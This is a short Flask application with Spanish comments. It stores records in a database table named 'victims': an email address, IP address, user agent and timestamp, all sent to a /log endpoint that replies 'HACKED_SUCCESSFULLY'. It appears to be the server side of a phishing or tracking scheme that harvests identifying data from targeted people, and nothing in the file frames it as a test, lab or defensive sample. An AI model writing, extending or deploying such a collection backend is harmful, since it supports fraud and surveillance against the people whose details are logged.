from flask import Flask, request, jsonify, render_template
from flask_sqlalchemy import SQLAlchemy
import os
from datetime import datetime

app = Flask(__name__)

# Obtener y limpiar la variable de entorno DATABASE_URL
db_url = os.getenv('DATABASE_URL')
if db_url:
    # Limpiar espacios y saltos de línea
    db_url = db_url.strip()
    # Asegurar que el esquema sea 'postgresql://'
    if db_url.startswith("postgres://"):
        db_url = db_url.replace("postgres://", "postgresql://", 1)
    app.config['SQLALCHEMY_DATABASE_URI'] = db_url
else:
    raise ValueError("La variable de entorno DATABASE_URL no está configurada")

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class Victim(db.Model):
    __tablename__ = 'victims'
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    user_agent = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_victim():
    data = request.json
    try:
        new_victim = Victim(
            email=data.get('email'),
            ip=data.get('ip'),
            user_agent=data.get('user_agent')
        )
        db.session.add(new_victim)
        db.session.commit()
        return jsonify({"status": "HACKED_SUCCESSFULLY"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

